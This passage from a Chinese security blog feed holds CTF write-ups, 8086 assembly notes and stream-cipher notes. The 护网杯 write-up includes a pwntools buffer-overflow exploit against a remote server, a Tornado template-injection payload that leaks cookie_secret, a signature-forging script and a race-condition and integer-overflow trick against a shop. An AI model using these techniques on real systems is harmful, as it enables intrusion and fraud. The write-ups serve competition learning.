class="line">01110100=t</span><br><span class="line">01110101=u</span><br><span class="line">01101110=n</span><br><span class="line">01100101=e</span><br><span class="line">01011111=_</span><br><span class="line">00110101=5</span><br><span class="line">00110011=3</span><br><span class="line">01110110=v</span><br><span class="line">01100101=e</span><br><span class="line">01110010=r</span><br><span class="line">01111101=&#125;</span><br></pre></td></tr></table></figure><h4 id="5-神秘的文件名（300）"><a href="#5-神秘的文件名（300）" class="headerlink" title="5.神秘的文件名（300）"></a>5.神秘的文件名（300）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:小明某天下载了 mobile.tar.gz压缩包，将代码进行修改后发现了神奇的东西请选手分析并获取flag。flag形式为8位小写字母。下载地址：http://101.231.137.47:8899/mobile.tar.gz</span><br></pre></td></tr></table></figure><p>解压得到CTF_300放到IDA里找到main函数，f5转伪C代码，然后很明显看到要想得到flag先得通过sub_C14函数判断</p><p><img src="https://i.loli.net/2018/10/29/5bd6ab7597000.png" alt=""></p><p>而byte_4008首先要通过sub_A30进行异或操作</p><p><img src="https://i.loli.net/2018/10/29/5bd6abd71e073.png" alt=""></p><p>并且进到sub_C14函数可以看到</p><p><img src="https://i.loli.net/2018/10/29/5bd6ac928aba1.png" alt=""></p><p>初始值v3等于7，通过判断v2的值来跳转到LABEL_26。</p><p><img src="https://i.loli.net/2018/10/29/5bd6acf930c34.png" alt=""></p><p>而LABEL_26通过sub_EAC来改变v3的值。所以8次验证正好修改v3的值得到8位的flag。通过思考地推得出v3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7   1   3   6   5   9   4   2</span><br></pre></td></tr></table></figure><p>再加上输入为0，放脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">105</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">100</span>]</span><br><span class="line">b=[i^<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">c=[b[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b))]</span><br><span class="line">d=[a[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))]</span><br><span class="line">s1=<span class="string">''</span></span><br><span class="line">s2=<span class="string">''</span></span><br><span class="line">s3=<span class="string">''</span></span><br><span class="line">s4=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    s1+=chr(a[i])</span><br><span class="line">    s2+=chr(b[i])</span><br><span class="line">    s3+=chr(c[i])</span><br><span class="line">    s4+=chr(d[i])</span><br><span class="line">print(s1)</span><br><span class="line">print(s2)</span><br><span class="line">print(s3)</span><br><span class="line">print(s4)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>8086通用指令</title>
    <link href="http://yoursite.com/2018/10/16/8086%E9%80%9A%E7%94%A8%E6%8C%87%E4%BB%A4%E4%B9%8B%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>http://yoursite.com/2018/10/16/8086通用指令之通用寄存器/</id>
    <published>2018-10-15T16:00:00.000Z</published>
    <updated>2018-10-16T14:16:39.645Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS：https://blog.csdn.net/Super_Yiang/article/details/83098536</span></span><br></pre></td></tr></table></figure><h4 id="8086寄存器"><a href="#8086寄存器" class="headerlink" title="8086寄存器"></a>8086寄存器</h4><p>8086 有14个16位寄存器，这14个寄存器按其用途可分为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)通用寄存器</span><br><span class="line"></span><br><span class="line">(2)指令指针</span><br><span class="line"></span><br><span class="line">(3)标志寄存器</span><br><span class="line"></span><br><span class="line">(4)段寄存器等4类。</span><br></pre></td></tr></table></figure><p> 有8个, 又可以分成2组，一组是数据寄存器(4个),另一组是指针寄存器及变址寄存器(4个)。</p><p>顾名思义，通用寄存器是那些你可以根据自己的意愿使用的寄存器，修改他们的值通常不会对计算机的运行造成很大的影响。 </p><p><img src="https://i.loli.net/2018/10/16/5bc5512b1983d.png" alt=""></p><p>通用寄存器的数据寄存器是两个字节，以AX为例，分为高8位（AH）低8位（AL）</p><p><img src="https://i.loli.net/2018/10/16/5bc595391ffef.png" alt=""></p><h4 id="基础汇编指令"><a href="#基础汇编指令" class="headerlink" title="基础汇编指令"></a>基础汇编指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add al,1(如果ax=00FFH,那么ax会等于=0000H,进位标志CF变为1）al的值加1赋给al</span><br><span class="line">sub al,1 al的值减1赋给al</span><br><span class="line">mov ax,[1000H]  把值为1000H的地址放到ax</span><br><span class="line">push ax ESP指向的地址减2，把ax里的值压入栈</span><br><span class="line">pop ax  ESP指向的地址加2，把ax里的值弹出栈</span><br></pre></td></tr></table></figure><p>CPU是从高地址往低地址读取。</p><p><img src="https://i.loli.net/2018/10/16/5bc591559a6bd.png" alt=""></p><p><img src="https://i.loli.net/2018/10/16/5bc591a327aec.png" alt=""></p><p><img src="https://i.loli.net/2018/10/16/5bc5933ede6e8.png" alt=""></p><p><img src="https://i.loli.net/2018/10/16/5bc5f0adf1575.png" alt=""></p><h4 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h4><p>在存储器里以字节为单位存储 信息，为正确地存放或取得信息，每一个字节单元给以一个唯一的存储器地址，称为物理地址，又叫实际地址或绝对地址。</p><p>8086是16位的CPU，地址总线是20位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">物理地址=段地址*10H+偏移地址</span><br><span class="line">例：</span><br><span class="line">CS：2000H，IP：0033H</span><br><span class="line">物理地址=2000H*10H+0033H=20033H</span><br></pre></td></tr></table></figure><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>先进后出，后进先出，是从高地址往低地址存入。</p><p>ESP指向当前的栈顶，EBP是基址指针。</p><h4 id="内存寻址方式"><a href="#内存寻址方式" class="headerlink" title="内存寻址方式"></a>内存寻址方式</h4><p><img src="https://i.loli.net/2018/10/16/5bc5874307af1.png" alt=""></p><h4 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h4><p><img src="https://i.loli.net/2018/10/16/5bc5ec7fbecd4.png" alt=""></p><p><img src="https://i.loli.net/2018/10/16/5bc5edc3f1a10.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="二进制" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="二进制" scheme="http://yoursite.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>护网杯WP</title>
    <link href="http://yoursite.com/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/"/>
    <id>http://yoursite.com/2018/10/14/护网杯WP/</id>
    <published>2018-10-13T16:00:00.000Z</published>
    <updated>2018-10-13T16:22:35.427Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS:https://blog.csdn.net/Super_Yiang/article/details/83043874</span></span><br></pre></td></tr></table></figure><p>护网杯大赛告终，很难，但是学到了很多，码上自己所学的和大佬的WP，并奉上大佬的<a href="https://qingchenldl.github.io/" target="_blank" rel="noopener">博客地址</a></p><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>题目是“easy xor”，这个题应该和异或运算相关。</p><p>下载文件之后发现这个字符串很像base64加密之后的</p><p><img src="https://i.loli.net/2018/10/13/5bc2023aac738.png" alt=""></p><p>Base64解码试一下：</p><p><img src="https://i.loli.net/2018/10/13/5bc202799c924.png" alt=""></p><p>考虑到可能还有异或操作，虽然有乱码暂时可以接受。然后就是写异或的脚本了，不太清楚和谁异或，写个循环..吧，放脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">a = <span class="string">"AAoHAR1XICciX1IlXiBUVFFUIyRRJFRQVyUnVVMnUFcgIiNXXhs="</span></span><br><span class="line">b=base64.b64decode(a.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">c = b.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> c:</span><br><span class="line">        f=ord(a)^i</span><br><span class="line">        print(chr(f),end=<span class="string">""</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p>运行一下，就出flag了</p><p><img src="https://i.loli.net/2018/10/13/5bc202fe9439e.png" alt=""></p><h4 id="Fez-密码题"><a href="#Fez-密码题" class="headerlink" title="Fez(密码题)"></a>Fez(密码题)</h4><p>看题目…没有题目，下载附件发现里边有两个文件</p><p><img src="https://i.loli.net/2018/10/13/5bc2033698cff.png" alt=""></p><p>fez.log</p><p><img src="https://i.loli.net/2018/10/13/5bc203533d79a.png" alt=""></p><p>看过py文件之后很容易知道这是test fez(test,K) fez(m,K)的输出结果</p><p>从后往前看加密算法：</p><p>K是一个包含7组27位随机数的嵌套列表</p><p>M是flag加上几位随机数</p><p>Fez()函数调用了7次round()函数，round()函数是将输入的明文分成两部分，右半部分作为新序列的左半部分，新序列的右半部分通过异或产生。如此循环之后相当于明文的右半部分经过3次异或，而左半部分经过4次异或。</p><p>至此加密算法分析完成。</p><p>由于明文左右两部分均经过加密，因此考虑将K密钥组想象成一个密钥k</p><p>……….开始尝试……..</p><p>假设输入p，执行fez(p,K)</p><p>R1=p_l</p><p>L1=xor(xor(p_l,p_r),K1)</p><p>第一轮加密之后，可看成对R1L1进行3轮加密</p><p>开始解码了….</p><p>已知test和fez(test,K)</p><p>所以，</p><p>tk_l=xor(test_r,k1) </p><p>tk_r=xor(xor(test_l,test_r),k2)</p><p>得到，</p><p>k1=xor(tk_l,test_r)</p><p>k2=xor(xor(test_l,test_r),tk_r)</p><p>由mk=fez(m,K)</p><p>得到，</p><p>mk_l=xor(m_l,k1)</p><p>mk_r=xor(xor(m_l,m_r),k2)</p><p>因此，</p><p>m_l=xor(k1,mk_l)</p><p>m_r=xor(xor(m_l,mk_r),k2)</p><p>分析完成，写脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Lout=R^k1^k2^k4^k5</span></span><br><span class="line"><span class="comment">#Rout=L^R^k0^k1^k2^k3^k5</span></span><br><span class="line"></span><br><span class="line">test = <span class="string">'c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5'</span></span><br><span class="line">test_out = <span class="string">'5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81'</span></span><br><span class="line">flag_out = <span class="string">'519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76'</span></span><br><span class="line"></span><br><span class="line">L = test.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R = test.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">L2 = test_out.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R2 = test_out.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">k1 = xor(L2,R)</span><br><span class="line">k2 = xor(xor(L,R), R2)</span><br><span class="line"></span><br><span class="line">L3 = flag_out.decode(<span class="string">'hex'</span>)[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R3 = flag_out.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">R4 = xor(L3,k1)</span><br><span class="line">L4 = xor(xor(k2,R3), R4)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, L4+R4</span><br></pre></td></tr></table></figure><p>Flag：</p><p><img src="https://i.loli.net/2018/10/13/5bc203a26d95c.png" alt=""></p><h4 id="gettingstart-（pwn）"><a href="#gettingstart-（pwn）" class="headerlink" title="gettingstart （pwn）"></a>gettingstart （pwn）</h4><p>先用IDA打开程序:</p><p><img src="https://i.loli.net/2018/10/13/5bc2059472635.png" alt=""></p><p>很明显可以通过溢出buf从而修改v7和v8的值满足判断和验证，所以构造脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./task_gettingStart_ktQeERc")</span></span><br><span class="line">p=remote(<span class="string">"49.4.94.186"</span>,<span class="number">31936</span>)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=<span class="string">"A"</span>*<span class="number">24</span>+p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="number">0x3FB999999999999A</span>)</span><br><span class="line">cmd=<span class="string">"cat flag"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.send(cmd)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure><p>就可以get到flag了。</p><h4 id="easy-tornado-（WEB）"><a href="#easy-tornado-（WEB）" class="headerlink" title="easy tornado （WEB）"></a>easy tornado （WEB）</h4><p>打开链接：</p><p><img src="https://i.loli.net/2018/10/13/5bc207ed9e237.png" alt=""></p><p>分别打开，列出URL和内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=Orz.txt&amp;signature=d18abfad58ea53975f7cefbc16852b0c</span><br><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://117.78.26.79:31093/file?filename=hint.txt&amp;signature=6724dcffafb1cbebd3034a845b3fcab3</span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://117.78.26.79:31093/file?filename=flag.txt&amp;signature=a93589fc419617a5a0b91ab5443c5eaa</span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure><p>发现就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=[文件名]&amp;signature=[签名]</span><br><span class="line"></span><br><span class="line">签名是md5(cookie_secret + md5(filename))</span><br></pre></td></tr></table></figure><p>问题就是找到<code>cookie_secret</code>，再看看<code>Orz.txt</code>里有说<code>render()</code>，看过大佬WP说这是生成模板的函数，所以注入STTI。</p><p>输入读取文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/file?filename=t.txt&amp;signature=6724dcffafb1cbebd3034a845b3fcab3</span><br></pre></td></tr></table></figure><p>发现读取文件失败，但是从失败的链接中发现STTI漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/error?msg=xxxx</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/13/5bc20bc0296db.png" alt=""></p><p>然后就是测试是否存在过滤，发现过滤的字符有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&apos;()*-/=[\]_|</span><br></pre></td></tr></table></figure><p>这时候大佬的WP又起作用了</p><p><img src="https://i.loli.net/2018/10/13/5bc20c5bda469.png" alt=""></p><p>并附上<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p><p>构造payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/13/5bc20d03ea0fb.png" alt=""></p><p>得到<code>cookie_secret</code>，利用这个<code>cookie_secret</code>，可以写脚本，来获得相应文件的签名值。 </p><p>附上大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cookie_secret=<span class="string">r'vjEg&gt;W_%Vr.Jd&lt;H(n)@wz&amp;20ut8&#123;i9O$&#125;MBDbCf!YFQ~xh3eA?4cK1X[oIZ*6+5U'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(code)</span>:</span></span><br><span class="line">temp = hashlib.md5(str(code)).hexdigest()</span><br><span class="line"><span class="keyword">return</span> temp</span><br><span class="line">filename = <span class="string">'/fllllllllllag'</span></span><br><span class="line">res = md5(cookie_secret + md5(filename))</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 44f26315d2ed77e83fa715d9d6b48f96</span></span><br></pre></td></tr></table></figure><p>跑完脚本，放进URL就出flag了</p><p><img src="https://i.loli.net/2018/10/13/5bc20e51a9dc7.png" alt=""></p><h4 id="ltshop（WEB）"><a href="#ltshop（WEB）" class="headerlink" title="ltshop（WEB）"></a>ltshop（WEB）</h4><p>注册账号，进入系统，发现我们有￥20 </p><p><img src="https://i.loli.net/2018/10/13/5bc20f411f030.png" alt=""></p><p>看一下要求 </p><p><img src="https://i.loli.net/2018/10/13/5bc20f68ef722.png" alt=""></p><p>思路很清晰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开局¥20</span><br><span class="line">一包大辣条¥5</span><br><span class="line">5包大辣条换一包辣条之王</span><br><span class="line">9999999包辣条之王才能换flag</span><br></pre></td></tr></table></figure><p>很明显按照正常思路是不可能买到辣条之王的，更别说要用那么多的辣条之王换flag，所以猜测会用到溢出，但是要溢出至少也需要一包辣条之王才行。</p><p>这时候万能的大佬WP成功上线，条件竞争，大佬经过试验发现一个账户同时登陆两个页面同时买辣条，只会扣一次钱，却会得到两根辣条。大佬用burpsuite进行条件竞争，设置多个线程：</p><p><img src="https://i.loli.net/2018/10/14/5bc218a5ed999.png" alt=""></p><p>然后发现成功的买到了15包大辣条</p><p><img src="https://i.loli.net/2018/10/14/5bc218d2b6402.png" alt=""></p><p>接下来考虑溢出（大佬的WP写着）：</p><p>int： <code>2**32-1 = 4294967295</code></p><p>long： <code>2**63 -1 = 9223372036854775807</code></p><p>longlong： <code>2**64-1 = 18446744073709551615</code></p><p>但是要<strong>注意一点，这个题的逻辑是，numer*5&lt;最大值</strong></p><p>所以，其临界值应该为<code>18446744073709551615 / 5 == 3689348814741910323</code></p><p>于是尝试<code>3689348814741910323+1 == 3689348814741910324</code></p><p>溢出后的值比较小，在辣条的数量之内，从而兑换成功。</p><p><img src="https://i.loli.net/2018/10/14/5bc2194c8d2fc.png" alt=""></p><p><img src="https://i.loli.net/2018/10/14/5bc21978432b6.png" alt=""></p><p>成功的购买到了很多辣条之王，可以兑换苦苦追寻的flag了。</p><p><img src="https://i.loli.net/2018/10/14/5bc21a02d1de5.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>流密码</title>
    <link href="http://yoursite.com/2018/10/10/%E6%B5%81%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2018/10/10/流密码/</id>
    <published>2018-10-09T16:00:00.000Z</published>
    <updated>2018-10-15T00:47:50.502Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS:https://blog.csdn.net/Super_Yiang/article/details/83005224</span></span><br></pre></td></tr></table></figure><p>初学密码学，今天学了流密码，做做笔记。</p><h5 id="流密码体制模型"><a href="#流密码体制模型" class="headerlink" title="流密码体制模型"></a>流密码体制模型</h5><p><img src="https://i.loli.net/2018/10/10/5bbe144397d34.png" alt=""></p><h5 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h5><p>​    根据加密器中记忆元件的存储状态是否依赖于输入的明文字符可分为两类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.同步流密码          #独立于明文字符</span><br><span class="line">2.自同步流密码        #依赖于输入的明文字符</span><br></pre></td></tr></table></figure><p>​    目前最常用的流密码体制是二元加法流密码，是一种同步流密码，其加密变换可表示为异或函数。</p><h5 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h5><p>​    移位寄存器是流密码长产生密钥流的一个主要组成部分。</p><p>​    线性反馈移位寄存器（ LFSR）是指，给定前一状态的输出，将该输出的<a href="https://baike.baidu.com/item/%E7%BA%BF%E6%80%A7%E5%87%BD%E6%95%B0/1085447" target="_blank" rel="noopener">线性函数</a>再用作输入的移位寄存器。异或运算是最常见的单比特线性函数：对寄存器的某些位进行异或操作后作为输入，再对寄存器中的各比特进行整体移位。 </p><p>​    线性反馈移位寄存器输出序列的性质完全由其反馈函数决定。</p><p>1、n级线性反馈移位寄存器==最多==有2^n^个不同的状态</p><p>2、n级n级线性反馈移位寄存器的状态周期==小于等于==2^n^-1</p><p>3、周期达到最大值的序列称为m序列</p><p>​    仅能被非0常数或自身的常数倍除尽，但不能被其他多项式除尽的多项式称为即约多项式或不可约多项式。</p><p>​    n级LFSR产生的序列有最大周期2^n^-1的==必要条件==是其特征多项式为不可约的。</p><p>​    若n次不可约多项式p(x)的阶为2^n^-1，则称p(x)是n次本原多项式。{a~i~}为m序列的==充要条件==为p(x)是本原多项式。</p><h5 id="伪随机序列"><a href="#伪随机序列" class="headerlink" title="伪随机序列"></a>伪随机序列</h5><p>​    Golomb对伪随机周期序列提出了应满足的如下3个==随机公设==：</p><p>（1）在序列的一个周期内，0与1的个数相差至多为1。</p><p>（2）在序列的一个周期内，长为1的游程占游程总数的1/2，长为2的游程占游程总数的1/4，长多为 i 的游程占游程总数的 1/2^i^ ，且在等长的游程中0的游程个数和1的游程个数相等。</p><p>（3）异自相关函数是一个常数。</p><p>​    n长m序列满足Golomb的3个随机性公设，具有如下==性质==：</p><p>（1）在一个周期内，0和1出现的次数分别为2^n-1^-1和2^n-1^。</p><p>（2）在一个周期内，总游程数为2^n^-1；对 1≤ i ≤ n-2，长为 i 的游程有2^n-i-1^个，且0和1游程各半；长为n-1的0游程一个，长为n的1游程一个。</p><h5 id="B-M算法"><a href="#B-M算法" class="headerlink" title="B-M算法"></a>B-M算法</h5><p>​    直接给公式：</p><p><img src="https://i.loli.net/2018/10/10/5bbe1d2d7f53e.png" alt=""></p><p>附上码来的的C代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 